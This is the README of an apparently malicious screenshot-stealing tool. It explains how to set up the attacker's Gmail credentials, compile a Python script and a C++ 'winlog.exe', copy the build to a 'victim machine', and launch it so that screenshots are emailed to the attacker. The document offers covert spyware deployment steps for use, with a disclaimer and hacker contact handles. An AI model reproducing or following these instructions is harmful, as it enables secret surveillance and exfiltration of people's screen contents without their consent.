# DISCLAIMER: We are not responsible of your act by using this tools.

## About:
This program take screenshot and send it to your email address 

## Requirements:
- Gmail Account
- Configure your Gmail by "Allow less secure apps to ON" link: https://myaccount.google.com/lesssecureapps
- GCC or equivalent to compile C++ program 
- Python >= 3.5 and pip3

## Step 1:
- Install Python module requirements with the following command

```
python3 -m pip install -r requirements.txt
```

## Step 2:
- Open "main.py" and change the following code with your email address and password
```python
    sender = "youremailadress@gmail.com"
    receiver = sender
    password = "youremailpassword"
```

- Open "cmd" and compile 'main.py' with the following command:

```
python3 setup.py build
```

## Step3:
- Compile "winlog.cpp"

## Step4:
- Copy "winlog.exe" to "\build\exe.win-amd64-3.7\"
- Copy the Folder "build" to your victim machine
- Launch "winlog.exe" and you should receive screenshot in your mail inbox

## PS:
### You can improve and modify the code if you want!
Please contact us if you found issues ! 
Have Fun! 

## Contact:
twitter : @ryurina23 / @malagasyhacker

# DISCLAIMER: We are not responsible of your act by using this tools.